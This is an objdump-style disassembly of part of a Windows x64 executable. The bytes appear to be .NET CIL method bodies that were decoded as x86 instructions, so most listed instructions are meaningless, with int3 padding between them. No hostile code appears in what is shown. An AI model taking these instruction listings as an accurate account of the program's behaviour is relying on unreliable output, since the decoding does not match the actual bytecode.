   140007de4:	00 00                	add    %al,(%rax)
   140007de6:	0a 0c 02             	or     (%rdx,%rax,1),%cl
   140007de9:	28 04 01             	sub    %al,(%rcx,%rax,1)
   140007dec:	00 06                	add    %al,(%rsi)
   140007dee:	2c 0e                	sub    $0xe,%al
   140007df0:	02 28                	add    (%rax),%ch
   140007df2:	04 01                	add    $0x1,%al
   140007df4:	00 06                	add    %al,(%rsi)
   140007df6:	6f                   	outsl  (%rsi),(%dx)
   140007df7:	4d 00 00             	rex.WRB add %r8b,(%r8)
   140007dfa:	0a 0b                	or     (%rbx),%cl
   140007dfc:	2b 06                	sub    (%rsi),%eax
   140007dfe:	7e 46                	jle    0x140007e46
   140007e00:	00 00                	add    %al,(%rax)
   140007e02:	0a 0b                	or     (%rbx),%cl
   140007e04:	1a 8d 03 00 00 01    	sbb    0x1000003(%rbp),%cl
   140007e0a:	0a 02                	or     (%rdx),%al
   140007e0c:	6f                   	outsl  (%rsi),(%dx)
   140007e0d:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140007e10:	0a 13                	or     (%rbx),%dl
   140007e12:	06                   	(bad)
   140007e13:	06                   	(bad)
   140007e14:	16                   	(bad)
   140007e15:	11 06                	adc    %eax,(%rsi)
   140007e17:	a2 02 6f 50 00 00 0a 	movabs %al,0xa2c0a0000506f02
   140007e1e:	2c 0a 
   140007e20:	02 6f 50             	add    0x50(%rdi),%ch
   140007e23:	00 00                	add    %al,(%rax)
   140007e25:	0a 13                	or     (%rbx),%dl
   140007e27:	05 2b 07 7e 46       	add    $0x467e072b,%eax
   140007e2c:	00 00                	add    %al,(%rax)
   140007e2e:	0a 13                	or     (%rbx),%dl
   140007e30:	05 06 17 11 05       	add    $0x5111706,%eax
   140007e35:	a2 08 2c 05 08 13 04 	movabs %al,0x72b041308052c08
   140007e3c:	2b 07 
   140007e3e:	7e 46                	jle    0x140007e86
   140007e40:	00 00                	add    %al,(%rax)
   140007e42:	0a 13                	or     (%rbx),%dl
   140007e44:	04 06                	add    $0x6,%al
   140007e46:	18 11                	sbb    %dl,(%rcx)
   140007e48:	04 a2                	add    $0xa2,%al
   140007e4a:	07                   	(bad)
   140007e4b:	2c 04                	sub    $0x4,%al
   140007e4d:	07                   	(bad)
   140007e4e:	0d 2b 06 7e 46       	or     $0x467e062b,%eax
   140007e53:	00 00                	add    %al,(%rax)
   140007e55:	0a 0d 06 19 09 a2    	or     -0x5df6e6fa(%rip),%cl        # 0xe2099761
   140007e5b:	72 18                	jb     0x140007e75
   140007e5d:	01 00                	add    %eax,(%rax)
   140007e5f:	70 06                	jo     0x140007e67
   140007e61:	28 45 00             	sub    %al,0x0(%rbp)
   140007e64:	00 0a                	add    %cl,(%rdx)
   140007e66:	02 28                	add    (%rax),%ch
   140007e68:	44 00 00             	add    %r8b,(%rax)
   140007e6b:	0a 2a                	or     (%rdx),%ch
   140007e6d:	cc                   	int3
   140007e6e:	cc                   	int3
   140007e6f:	cc                   	int3
   140007e70:	03 30                	add    (%rax),%esi
   140007e72:	04 00                	add    $0x0,%al
   140007e74:	2e 00 00             	cs add %al,(%rax)
   140007e77:	00 61 00             	add    %ah,0x0(%rcx)
   140007e7a:	00 11                	add    %dl,(%rcx)
   140007e7c:	02 03                	add    (%rbx),%al
   140007e7e:	04 28                	add    $0x28,%al
   140007e80:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140007e83:	0a d0                	or     %al,%dl
   140007e85:	30 00                	xor    %al,(%rax)
   140007e87:	00 01                	add    %al,(%rcx)
   140007e89:	28 07                	sub    %al,(%rdi)
   140007e8b:	00 00                	add    %al,(%rax)
   140007e8d:	0a 0b                	or     (%rbx),%cl
   140007e8f:	02 28                	add    (%rax),%ch
   140007e91:	04 01                	add    $0x1,%al
   140007e93:	00 06                	add    %al,(%rsi)
   140007e95:	0a 03                	or     (%rbx),%al
   140007e97:	72 4d                	jb     0x140007ee6
   140007e99:	02 00                	add    (%rax),%al
   140007e9b:	70 06                	jo     0x140007ea3
   140007e9d:	07                   	(bad)
   140007e9e:	28 42 00             	sub    %al,0x0(%rdx)
   140007ea1:	00 0a                	add    %cl,(%rdx)
   140007ea3:	02 28                	add    (%rax),%ch
   140007ea5:	44 00 00             	add    %r8b,(%rax)
   140007ea8:	0a 2a                	or     (%rdx),%ch
   140007eaa:	cc                   	int3
   140007eab:	cc                   	int3
   140007eac:	03 30                	add    (%rax),%esi
   140007eae:	04 00                	add    $0x0,%al
   140007eb0:	33 00                	xor    (%rax),%eax
   140007eb2:	00 00                	add    %al,(%rax)
   140007eb4:	62                   	(bad)
   140007eb5:	00 00                	add    %al,(%rax)
   140007eb7:	11 02                	adc    %eax,(%rdx)
   140007eb9:	03 04 28             	add    (%rax,%rbp,1),%eax
   140007ebc:	ff 00                	incl   (%rax)
   140007ebe:	00 06                	add    %al,(%rsi)
   140007ec0:	d0 30                	shlb   $1,(%rax)
   140007ec2:	00 00                	add    %al,(%rax)
   140007ec4:	01 28                	add    %ebp,(%rax)
   140007ec6:	07                   	(bad)
   140007ec7:	00 00                	add    %al,(%rax)
   140007ec9:	0a 0b                	or     (%rbx),%cl
   140007ecb:	72 4d                	jb     0x140007f1a
   140007ecd:	02 00                	add    (%rax),%al
   140007ecf:	70 0a                	jo     0x140007edb
   140007ed1:	02 03                	add    (%rbx),%al
   140007ed3:	06                   	(bad)
   140007ed4:	07                   	(bad)
   140007ed5:	28 43 00             	sub    %al,0x0(%rbx)
   140007ed8:	00 0a                	add    %cl,(%rdx)
   140007eda:	74 30                	je     0x140007f0c
   140007edc:	00 00                	add    %al,(%rax)
   140007ede:	01 28                	add    %ebp,(%rax)
   140007ee0:	05 01 00 06 02       	add    $0x2060001,%eax
   140007ee5:	28 44 00 00          	sub    %al,0x0(%rax,%rax,1)
   140007ee9:	0a 2a                	or     (%rdx),%ch
   140007eeb:	cc                   	int3
   140007eec:	03 30                	add    (%rax),%esi
   140007eee:	01 00                	add    %eax,(%rax)
   140007ef0:	08 00                	or     %al,(%rax)
   140007ef2:	00 00                	add    %al,(%rax)
   140007ef4:	00 00                	add    %al,(%rax)
   140007ef6:	00 00                	add    %al,(%rax)
   140007ef8:	02 73 01             	add    0x1(%rbx),%dh
   140007efb:	01 00                	add    %eax,(%rax)
   140007efd:	06                   	(bad)
   140007efe:	7a 2a                	jp     0x140007f2a
   140007f00:	03 30                	add    (%rax),%esi
   140007f02:	02 00                	add    (%rax),%al
   140007f04:	09 00                	or     %eax,(%rax)
   140007f06:	00 00                	add    %al,(%rax)
   140007f08:	00 00                	add    %al,(%rax)
   140007f0a:	00 00                	add    %al,(%rax)
   140007f0c:	02 03                	add    (%rbx),%al
   140007f0e:	73 00                	jae    0x140007f10
   140007f10:	01 00                	add    %eax,(%rax)
   140007f12:	06                   	(bad)
   140007f13:	7a 2a                	jp     0x140007f3f
   140007f15:	cc                   	int3
   140007f16:	cc                   	int3
   140007f17:	cc                   	int3
   140007f18:	0b 30                	or     (%rax),%esi
   140007f1a:	04 00                	add    $0x0,%al
   140007f1c:	36 00 00             	ss add %al,(%rax)
   140007f1f:	00 4f 00             	add    %cl,0x0(%rdi)
   140007f22:	00 11                	add    %dl,(%rcx)
   140007f24:	16                   	(bad)
   140007f25:	0a 28                	or     (%rax),%ch
   140007f27:	41 00 00             	add    %al,(%r8)
   140007f2a:	0a 28                	or     (%rax),%ch
   140007f2c:	41 00 00             	add    %al,(%r8)
   140007f2f:	0a 7e d7             	or     -0x29(%rsi),%bh
   140007f32:	00 00                	add    %al,(%rax)
   140007f34:	04 12                	add    $0x12,%al
   140007f36:	00 28                	add    %ch,(%rax)
   140007f38:	39 00                	cmp    %eax,(%rax)
   140007f3a:	00 0a                	add    %cl,(%rdx)
   140007f3c:	03 28                	add    (%rax),%ebp
   140007f3e:	40 00 00             	rex add %al,(%rax)
   140007f41:	0a 02                	or     (%rdx),%al
   140007f43:	03 6f 5a             	add    0x5a(%rdi),%ebp
   140007f46:	00 00                	add    %al,(%rax)
   140007f48:	0a de                	or     %dh,%bl
   140007f4a:	0e                   	(bad)
   140007f4b:	06                   	(bad)
   140007f4c:	2c 0a                	sub    $0xa,%al
   140007f4e:	7e d7                	jle    0x140007f27
   140007f50:	00 00                	add    %al,(%rax)
   140007f52:	04 28                	add    $0x28,%al
   140007f54:	26 00 00             	es add %al,(%rax)
   140007f57:	0a dc                	or     %ah,%bl
   140007f59:	2a 00                	sub    (%rax),%al
   140007f5b:	00 41 1c             	add    %al,0x1c(%rcx)
   140007f5e:	00 00                	add    %al,(%rax)
   140007f60:	02 00                	add    (%rax),%al
   140007f62:	00 00                	add    %al,(%rax)
   140007f64:	07                   	(bad)
   140007f65:	00 00                	add    %al,(%rax)
   140007f67:	00 20                	add    %ah,(%rax)
   140007f69:	00 00                	add    %al,(%rax)
   140007f6b:	00 27                	add    %ah,(%rdi)
   140007f6d:	00 00                	add    %al,(%rax)
   140007f6f:	00 0e                	add    %cl,(%rsi)
   140007f71:	00 00                	add    %al,(%rax)
   140007f73:	00 46 00             	add    %al,0x0(%rsi)
   140007f76:	00 01                	add    %al,(%rcx)
   140007f78:	0b 30                	or     (%rax),%esi
   140007f7a:	04 00                	add    $0x0,%al
   140007f7c:	61                   	(bad)
   140007f7d:	00 00                	add    %al,(%rax)
   140007f7f:	00 66 00             	add    %ah,0x0(%rsi)
   140007f82:	00 11                	add    %dl,(%rcx)
   140007f84:	16                   	(bad)
   140007f85:	0c 28                	or     $0x28,%al
   140007f87:	41 00 00             	add    %al,(%r8)
   140007f8a:	0a 28                	or     (%rax),%ch
   140007f8c:	41 00 00             	add    %al,(%r8)
   140007f8f:	0a 7e d7             	or     -0x29(%rsi),%bh
   140007f92:	00 00                	add    %al,(%rax)
   140007f94:	04 12                	add    $0x12,%al
   140007f96:	02 28                	add    (%rax),%ch
   140007f98:	39 00                	cmp    %eax,(%rax)
   140007f9a:	00 0a                	add    %cl,(%rdx)
   140007f9c:	02 6f 59             	add    0x59(%rdi),%ch
   140007f9f:	00 00                	add    %al,(%rax)
   140007fa1:	0a 0a                	or     (%rdx),%cl
   140007fa3:	06                   	(bad)
   140007fa4:	6f                   	outsl  (%rsi),(%dx)
   140007fa5:	5b                   	pop    %rbx
   140007fa6:	00 00                	add    %al,(%rax)
   140007fa8:	0a 2c 14             	or     (%rsp,%rdx,1),%ch
   140007fab:	06                   	(bad)
   140007fac:	6f                   	outsl  (%rsi),(%dx)
   140007fad:	5c                   	pop    %rsp
   140007fae:	00 00                	add    %al,(%rax)
   140007fb0:	0a 74 34 00          	or     0x0(%rsp,%rsi,1),%dh
   140007fb4:	00 01                	add    %al,(%rcx)
   140007fb6:	03 04 6f             	add    (%rdi,%rbp,2),%eax
   140007fb9:	49 00 00             	rex.WB add %al,(%r8)
   140007fbc:	0a 2b                	or     (%rbx),%ch
   140007fbe:	e4 de                	in     $0xde,%al
   140007fc0:	13 06                	adc    (%rsi),%eax
   140007fc2:	0d 06 75 38 00       	or     $0x387506,%eax
   140007fc7:	00 01                	add    %al,(%rcx)
   140007fc9:	0b 07                	or     (%rdi),%eax
   140007fcb:	2c 06                	sub    $0x6,%al
   140007fcd:	07                   	(bad)
   140007fce:	6f                   	outsl  (%rsi),(%dx)
   140007fcf:	47 00 00             	rex.RXB add %r8b,(%r8)
   140007fd2:	0a dc                	or     %ah,%bl
   140007fd4:	de 0e                	fimuls (%rsi)
   140007fd6:	08 2c 0a             	or     %ch,(%rdx,%rcx,1)
   140007fd9:	7e d7                	jle    0x140007fb2
   140007fdb:	00 00                	add    %al,(%rax)
   140007fdd:	04 28                	add    $0x28,%al
   140007fdf:	26 00 00             	es add %al,(%rax)
   140007fe2:	0a dc                	or     %ah,%bl
   140007fe4:	2a 00                	sub    (%rax),%al
   140007fe6:	00 00                	add    %al,(%rax)
   140007fe8:	41 34 00             	rex.B xor $0x0,%al
   140007feb:	00 02                	add    %al,(%rdx)
   140007fed:	00 00                	add    %al,(%rax)
   140007fef:	00 1f                	add    %bl,(%rdi)
   140007ff1:	00 00                	add    %al,(%rax)
   140007ff3:	00 1e                	add    %bl,(%rsi)
   140007ff5:	00 00                	add    %al,(%rax)
   140007ff7:	00 3d 00 00 00 13    	add    %bh,0x13000000(%rip)        # 0x153007ffd
   140007ffd:	00 00                	add    %al,(%rax)
   140007fff:	00 46 00             	add    %al,0x0(%rsi)
   140008002:	00 01                	add    %al,(%rcx)
   140008004:	02 00                	add    (%rax),%al
   140008006:	00 00                	add    %al,(%rax)
   140008008:	07                   	(bad)
   140008009:	00 00                	add    %al,(%rax)
   14000800b:	00 4b 00             	add    %cl,0x0(%rbx)
   14000800e:	00 00                	add    %al,(%rax)
   140008010:	52                   	push   %rdx
   140008011:	00 00                	add    %al,(%rax)
   140008013:	00 0e                	add    %cl,(%rsi)
   140008015:	00 00                	add    %al,(%rax)
   140008017:	00 46 00             	add    %al,0x0(%rsi)
   14000801a:	00 01                	add    %al,(%rcx)
   14000801c:	03 30                	add    (%rax),%esi
   14000801e:	02 00                	add    (%rax),%al
   140008020:	0c 00                	or     $0x0,%al
   140008022:	00 00                	add    %al,(%rax)
   140008024:	00 00                	add    %al,(%rax)
   140008026:	00 00                	add    %al,(%rax)
   140008028:	7e d8                	jle    0x140008002
   14000802a:	00 00                	add    %al,(%rax)
   14000802c:	04 02                	add    $0x2,%al
   14000802e:	28 08                	sub    %cl,(%rax)
   140008030:	01 00                	add    %eax,(%rax)
   140008032:	06                   	(bad)
   140008033:	2a 03                	sub    (%rbx),%al
   140008035:	30 0d 00 44 00 00    	xor    %cl,0x4400(%rip)        # 0x14000c43b
   14000803b:	00 68 00             	add    %ch,0x0(%rax)
   14000803e:	00 11                	add    %dl,(%rcx)
   140008040:	12 00                	adc    (%rax),%al
   140008042:	02 4a 02             	add    0x2(%rdx),%cl
   140008045:	1a 6a 58             	sbb    0x58(%rdx),%ch
   140008048:	49 02 1c 6a          	rex.WB add (%r10,%rbp,2),%bl
   14000804c:	58                   	pop    %rax
   14000804d:	49 02 1e             	rex.WB add (%r14),%bl
   140008050:	6a 58                	push   $0x58
   140008052:	47 02 1f             	rex.RXB add (%r15),%r11b
   140008055:	09 6a 58             	or     %ebp,0x58(%rdx)
   140008058:	47 02 1f             	rex.RXB add (%r15),%r11b
   14000805b:	0a 6a 58             	or     0x58(%rdx),%ch
   14000805e:	47 02 1f             	rex.RXB add (%r15),%r11b
   140008061:	0b 6a 58             	or     0x58(%rdx),%ebp
   140008064:	47 02 1f             	rex.RXB add (%r15),%r11b
   140008067:	0c 6a                	or     $0x6a,%al
   140008069:	58                   	pop    %rax
   14000806a:	47 02 1f             	rex.RXB add (%r15),%r11b
   14000806d:	0d 6a 58 47 02       	or     $0x247586a,%eax
   140008072:	1f                   	(bad)
   140008073:	0e                   	(bad)
   140008074:	6a 58                	push   $0x58
   140008076:	47 02 1f             	rex.RXB add (%r15),%r11b
   140008079:	0f 6a 58 47          	punpckhdq 0x47(%rax),%mm3
   14000807d:	28 57 00             	sub    %dl,0x0(%rdi)
   140008080:	00 0a                	add    %cl,(%rdx)
   140008082:	06                   	(bad)
   140008083:	2a 0b                	sub    (%rbx),%cl
   140008085:	30 04 00             	xor    %al,(%rax,%rax,1)
   140008088:	57                   	push   %rdi
   140008089:	00 00                	add    %al,(%rax)
   14000808b:	00 6c 00 00          	add    %ch,0x0(%rax,%rax,1)
   14000808f:	11 16                	adc    %edx,(%rsi)
   140008091:	6a 0a                	push   $0xa
   140008093:	7f 6c                	jg     0x140008101
   140008095:	00 00                	add    %al,(%rax)
   140008097:	04 28                	add    $0x28,%al
   140008099:	9b                   	fwait
   14000809a:	00 00                	add    %al,(%rax)
   14000809c:	06                   	(bad)
   14000809d:	0d 7f 6b 00 00       	or     $0x6b7f,%eax
   1400080a2:	04 28                	add    $0x28,%al
   1400080a4:	9b                   	fwait
   1400080a5:	00 00                	add    %al,(%rax)
   1400080a7:	06                   	(bad)
   1400080a8:	09 28                	or     %ebp,(%rax)
   1400080aa:	3a 00                	cmp    (%rax),%al
   1400080ac:	00 0a                	add    %cl,(%rdx)
   1400080ae:	13 04 12             	adc    (%rdx,%rdx,1),%eax
   1400080b1:	04 28                	add    $0x28,%al
   1400080b3:	31 00                	xor    %eax,(%rax)
   1400080b5:	00 0a                	add    %cl,(%rdx)
   1400080b7:	0a de                	or     %dh,%bl
   1400080b9:	0c 28                	or     $0x28,%al
   1400080bb:	3e 00 00             	ds add %al,(%rax)
   1400080be:	0a 0b                	or     (%rbx),%cl
   1400080c0:	de 00                	fiadds (%rax)
   1400080c2:	07                   	(bad)
   1400080c3:	16                   	(bad)
   1400080c4:	32 1f                	xor    (%rdi),%bl
   1400080c6:	06                   	(bad)
   1400080c7:	4c 1f                	rex.WR (bad)
   1400080c9:	68 6a 58 4c 0c       	push   $0xc4c586a
   1400080ce:	06                   	(bad)
   1400080cf:	02 08                	add    (%rax),%cl
   1400080d1:	29 59 00             	sub    %ebx,0x0(%rcx)
   1400080d4:	00 11                	add    %dl,(%rcx)
   1400080d6:	0b 06                	or     (%rsi),%eax
   1400080d8:	25 4c 1f 10 6a       	and    $0x6a101f4c,%eax
   1400080dd:	58                   	pop    %rax
   1400080de:	4c 29 58 00          	sub    %r11,0x0(%rax)
   1400080e2:	00 11                	add    %dl,(%rcx)
   1400080e4:	26 07                	es (bad)
   1400080e6:	2a 00                	sub    (%rax),%al
   1400080e8:	41 1c 00             	rex.B sbb $0x0,%al
   1400080eb:	00 00                	add    %al,(%rax)
   1400080ed:	00 00                	add    %al,(%rax)
   1400080ef:	00 03                	add    %al,(%rbx)
   1400080f1:	00 00                	add    %al,(%rax)
   1400080f3:	00 27                	add    %ah,(%rdi)
   1400080f5:	00 00                	add    %al,(%rax)
   1400080f7:	00 2a                	add    %ch,(%rdx)
   1400080f9:	00 00                	add    %al,(%rax)
   1400080fb:	00 08                	add    %cl,(%rax)
   1400080fd:	00 00                	add    %al,(%rax)
   1400080ff:	00 30                	add    %dh,(%rax)
   140008101:	00 00                	add    %al,(%rax)
   140008103:	01 03                	add    %eax,(%rbx)
   140008105:	30 03                	xor    %al,(%rbx)
   140008107:	00 0f                	add    %cl,(%rdi)
   140008109:	00 00                	add    %al,(%rax)
   14000810b:	00 00                	add    %al,(%rax)
   14000810d:	00 00                	add    %al,(%rax)
   14000810f:	00 02                	add    %al,(%rdx)
   140008111:	25 4c 1f 10 6a       	and    $0x6a101f4c,%eax
   140008116:	58                   	pop    %rax
   140008117:	4c 29 58 00          	sub    %r11,0x0(%rax)
   14000811b:	00 11                	add    %dl,(%rcx)
   14000811d:	26 2a cc             	es sub %ah,%cl
   140008120:	0b 30                	or     (%rax),%esi
   140008122:	04 00                	add    $0x0,%al
   140008124:	36 00 00             	ss add %al,(%rax)
   140008127:	00 6e 00             	add    %ch,0x0(%rsi)
   14000812a:	00 11                	add    %dl,(%rcx)
   14000812c:	16                   	(bad)
   14000812d:	6a 0b                	push   $0xb
   14000812f:	12 01                	adc    (%rcx),%al
   140008131:	28 9c 00 00 06 0a 06 	sub    %bl,0x60a0600(%rax,%rax,1)
   140008138:	16                   	(bad)
   140008139:	32 1d 12 03 07 28    	xor    0x28070312(%rip),%bl        # 0x168078451
   14000813f:	06                   	(bad)
   140008140:	00 00                	add    %al,(%rax)
   140008142:	0a 09                	or     (%rcx),%cl
   140008144:	28 3f                	sub    %bh,(%rdi)
   140008146:	00 00                	add    %al,(%rax)
   140008148:	0a 74 39 00          	or     0x0(%rcx,%rdi,1),%dh
   14000814c:	00 01                	add    %al,(%rcx)
   14000814e:	0c de                	or     $0xde,%al
   140008150:	0f 07                	sysretl
   140008152:	28 9d 00 00 06 dc    	sub    %bl,-0x23fa0000(%rbp)
   140008158:	06                   	(bad)
   140008159:	28 3d 00 00 0a 14    	sub    %bh,0x140a0000(%rip)        # 0x1540a815f
   14000815f:	2a 08                	sub    (%rax),%cl
   140008161:	2a 00                	sub    (%rax),%al
   140008163:	00 41 1c             	add    %al,0x1c(%rcx)
   140008166:	00 00                	add    %al,(%rax)
   140008168:	02 00                	add    (%rax),%al
   14000816a:	00 00                	add    %al,(%rax)
   14000816c:	0f 00 00             	sldt   (%rax)
   14000816f:	00 16                	add    %dl,(%rsi)
   140008171:	00 00                	add    %al,(%rax)
   140008173:	00 25 00 00 00 07    	add    %ah,0x7000000(%rip)        # 0x147008179
   140008179:	00 00                	add    %al,(%rax)
   14000817b:	00 46 00             	add    %al,0x0(%rsi)
   14000817e:	00 01                	add    %al,(%rcx)
   140008180:	0b 30                	or     (%rax),%esi
   140008182:	05 00 61 00 00       	add    $0x6100,%eax
   140008187:	00 71 00             	add    %dh,0x0(%rcx)
   14000818a:	00 11                	add    %dl,(%rcx)
   14000818c:	7f 71                	jg     0x1400081ff
   14000818e:	00 00                	add    %al,(%rax)
   140008190:	04 28                	add    $0x28,%al
   140008192:	9b                   	fwait
   140008193:	00 00                	add    %al,(%rax)
   140008195:	06                   	(bad)
   140008196:	13 04 7f             	adc    (%rdi,%rdi,2),%eax
   140008199:	72 00                	jb     0x14000819b
   14000819b:	00 04 28             	add    %al,(%rax,%rbp,1)
   14000819e:	9b                   	fwait
   14000819f:	00 00                	add    %al,(%rax)
   1400081a1:	06                   	(bad)
   1400081a2:	11 04 28             	adc    %eax,(%rax,%rbp,1)
   1400081a5:	3a 00                	cmp    (%rax),%al
   1400081a7:	00 0a                	add    %cl,(%rdx)
   1400081a9:	13 05 12 05 28 31    	adc    0x31280512(%rip),%eax        # 0x1712886c1
   1400081af:	00 00                	add    %al,(%rax)
   1400081b1:	0a 0a                	or     (%rdx),%cl
   1400081b3:	28 9e 00 00 06 06    	sub    %bl,0x6060000(%rsi)
   1400081b9:	4c 1f                	rex.WR (bad)
   1400081bb:	40 6a 58             	rex push $0x58
   1400081be:	4c 0d 28 54 00 00    	rex.WR or $0x5428,%rax
   1400081c4:	0a 0c 06             	or     (%rsi,%rax,1),%cl
   1400081c7:	08 02                	or     %al,(%rdx)
   1400081c9:	03 09                	add    (%rcx),%ecx
   1400081cb:	29 5a 00             	sub    %ebx,0x0(%rdx)
   1400081ce:	00 11                	add    %dl,(%rcx)
   1400081d0:	0b 07                	or     (%rdi),%eax
   1400081d2:	16                   	(bad)
   1400081d3:	2f                   	(bad)
   1400081d4:	06                   	(bad)
   1400081d5:	07                   	(bad)
   1400081d6:	28 3d 00 00 0a de    	sub    %bh,-0x21f60000(%rip)        # 0x11e0a81dc
   1400081dc:	0f 06                	clts
   1400081de:	25 4c 1f 10 6a       	and    $0x6a101f4c,%eax
   1400081e3:	58                   	pop    %rax
   1400081e4:	4c 29 58 00          	sub    %r11,0x0(%rax)
   1400081e8:	00 11                	add    %dl,(%rcx)
   1400081ea:	26 dc 2a             	es fsubrl (%rdx)
   1400081ed:	00 00                	add    %al,(%rax)
   1400081ef:	00 41 1c             	add    %al,0x1c(%rcx)
   1400081f2:	00 00                	add    %al,(%rax)
   1400081f4:	02 00                	add    (%rax),%al
   1400081f6:	00 00                	add    %al,(%rax)
   1400081f8:	27                   	(bad)
   1400081f9:	00 00                	add    %al,(%rax)
   1400081fb:	00 2a                	add    %ch,(%rdx)
   1400081fd:	00 00                	add    %al,(%rax)
   1400081ff:	00 51 00             	add    %dl,0x0(%rcx)
   140008202:	00 00                	add    %al,(%rax)
   140008204:	0f 00 00             	sldt   (%rax)
   140008207:	00 46 00             	add    %al,0x0(%rsi)
   14000820a:	00 01                	add    %al,(%rcx)
   14000820c:	03 30                	add    (%rax),%esi
   14000820e:	02 00                	add    (%rax),%al
   140008210:	11 00                	adc    %eax,(%rax)
   140008212:	00 00                	add    %al,(%rax)
   140008214:	72 00                	jb     0x140008216
   140008216:	00 11                	add    %dl,(%rcx)
   140008218:	7e 94                	jle    0x1400081ae
   14000821a:	00 00                	add    %al,(%rax)
   14000821c:	04 0a                	add    $0xa,%al
   14000821e:	06                   	(bad)
   14000821f:	2c 06                	sub    $0x6,%al
   140008221:	06                   	(bad)
   140008222:	17                   	(bad)
   140008223:	2e 02 17             	cs add (%rdi),%dl
   140008226:	2a 16                	sub    (%rsi),%dl
   140008228:	2a cc                	sub    %ah,%cl
   14000822a:	cc                   	int3
   14000822b:	cc                   	int3
   14000822c:	cc                   	int3
   14000822d:	cc                   	int3
   14000822e:	cc                   	int3
   14000822f:	cc                   	int3
   140008230:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140008237:	00 00 
   140008239:	48 8b 40 08          	mov    0x8(%rax),%rax
   14000823d:	c3                   	ret
   14000823e:	cc                   	int3
   14000823f:	cc                   	int3
   140008240:	03 30                	add    (%rax),%esi
   140008242:	01 00                	add    %eax,(%rax)
   140008244:	11 00                	adc    %eax,(%rax)
   140008246:	00 00                	add    %al,(%rax)
   140008248:	00 00                	add    %al,(%rax)
   14000824a:	00 00                	add    %al,(%rax)
   14000824c:	20 ff                	and    %bh,%bh
   14000824e:	ff                   	(bad)
   14000824f:	ff                   	(bad)
   140008250:	7f 8c                	jg     0x1400081de
   140008252:	0d 00 00 01 28       	or     $0x28010000,%eax
   140008257:	44 00 00             	add    %r8b,(%rax)
   14000825a:	0a 16                	or     (%rsi),%dl
   14000825c:	2a cc                	sub    %ah,%cl
   14000825e:	cc                   	int3
   14000825f:	cc                   	int3
   140008260:	03 30                	add    (%rax),%esi
   140008262:	02 00                	add    (%rax),%al
   140008264:	47 00 00             	rex.RXB add %r8b,(%r8)
   140008267:	00 74 00 00          	add    %dh,0x0(%rax,%rax,1)
   14000826b:	11 7e 7e             	adc    %edi,0x7e(%rsi)
   14000826e:	00 00                	add    %al,(%rax)
   140008270:	04 18                	add    $0x18,%al
   140008272:	33 35 7f 87 00 00    	xor    0x877f(%rip),%esi        # 0x1400109f7
   140008278:	04 0a                	add    $0xa,%al
   14000827a:	7f 87                	jg     0x140008203
   14000827c:	00 00                	add    %al,(%rax)
   14000827e:	04 7f                	add    $0x7f,%al
   140008280:	7f 00                	jg     0x140008282
   140008282:	00 04 34             	add    %al,(%rsp,%rsi,1)
   140008285:	1b 06                	sbb    (%rsi),%eax
   140008287:	4c 2d 0f 06 1e 6a    	rex.WR sub $0x6a1e060f,%rax
   14000828d:	58                   	pop    %rax
   14000828e:	0a 06                	or     (%rsi),%al
   140008290:	7f 7f                	jg     0x140008311
   140008292:	00 00                	add    %al,(%rax)
   140008294:	04 37                	add    $0x37,%al
   140008296:	ef                   	out    %eax,(%dx)
   140008297:	2b 08                	sub    (%rax),%ecx
   140008299:	15 80 7e 00 00       	adc    $0x7e80,%eax
   14000829e:	04 17                	add    $0x17,%al
   1400082a0:	2a 16                	sub    (%rsi),%dl
   1400082a2:	80 7e 00 00          	cmpb   $0x0,0x0(%rsi)
   1400082a6:	04 16                	add    $0x16,%al
   1400082a8:	2a 7e 7e             	sub    0x7e(%rsi),%bh
   1400082ab:	00 00                	add    %al,(%rax)
   1400082ad:	04 15                	add    $0x15,%al
   1400082af:	fe 01                	incb   (%rcx)
   1400082b1:	d2 2a                	shrb   %cl,(%rdx)
   1400082b3:	cc                   	int3
   1400082b4:	03 30                	add    (%rax),%esi
   1400082b6:	02 00                	add    (%rax),%al
   1400082b8:	74 00                	je     0x1400082ba
   1400082ba:	00 00                	add    %al,(%rax)
   1400082bc:	75 00                	jne    0x1400082be
   1400082be:	00 11                	add    %dl,(%rcx)
   1400082c0:	7e 75                	jle    0x140008337
   1400082c2:	00 00                	add    %al,(%rax)
   1400082c4:	04 18                	add    $0x18,%al
   1400082c6:	33 62 7f             	xor    0x7f(%rdx),%esp
   1400082c9:	93                   	xchg   %eax,%ebx
   1400082ca:	00 00                	add    %al,(%rax)
   1400082cc:	04 0b                	add    $0xb,%al
   1400082ce:	7f 93                	jg     0x140008263
   1400082d0:	00 00                	add    %al,(%rax)
   1400082d2:	04 7f                	add    $0x7f,%al
   1400082d4:	8f 00                	pop    (%rax)
   1400082d6:	00 04 34             	add    %al,(%rsp,%rsi,1)
   1400082d9:	1b 07                	sbb    (%rdi),%eax
   1400082db:	4c 2d 0f 07 1e 6a    	rex.WR sub $0x6a1e070f,%rax
   1400082e1:	58                   	pop    %rax
   1400082e2:	0b 07                	or     (%rdi),%eax
   1400082e4:	7f 8f                	jg     0x140008275
   1400082e6:	00 00                	add    %al,(%rax)
   1400082e8:	04 37                	add    $0x37,%al
   1400082ea:	ef                   	out    %eax,(%dx)
   1400082eb:	2b 08                	sub    (%rax),%ecx
   1400082ed:	15 80 75 00 00       	adc    $0x7580,%eax
   1400082f2:	04 17                	add    $0x17,%al
   1400082f4:	2a 7f 92             	sub    -0x6e(%rdi),%bh
   1400082f7:	00 00                	add    %al,(%rax)
   1400082f9:	04 0a                	add    $0xa,%al
   1400082fb:	7f 92                	jg     0x14000828f
   1400082fd:	00 00                	add    %al,(%rax)
   1400082ff:	04 7f                	add    $0x7f,%al
   140008301:	95                   	xchg   %eax,%ebp
   140008302:	00 00                	add    %al,(%rax)
   140008304:	04 34                	add    $0x34,%al
   140008306:	1b 06                	sbb    (%rsi),%eax
   140008308:	4c 2d 0f 06 1e 6a    	rex.WR sub $0x6a1e060f,%rax
   14000830e:	58                   	pop    %rax
   14000830f:	0a 06                	or     (%rsi),%al
   140008311:	7f 95                	jg     0x1400082a8
   140008313:	00 00                	add    %al,(%rax)
   140008315:	04 37                	add    $0x37,%al
   140008317:	ef                   	out    %eax,(%dx)
   140008318:	2b 08                	sub    (%rax),%ecx
   14000831a:	15 80 75 00 00       	adc    $0x7580,%eax
   14000831f:	04 17                	add    $0x17,%al
   140008321:	2a 16                	sub    (%rsi),%dl
   140008323:	80 75 00 00          	xorb   $0x0,0x0(%rbp)
   140008327:	04 16                	add    $0x16,%al
   140008329:	2a 7e 75             	sub    0x75(%rsi),%bh
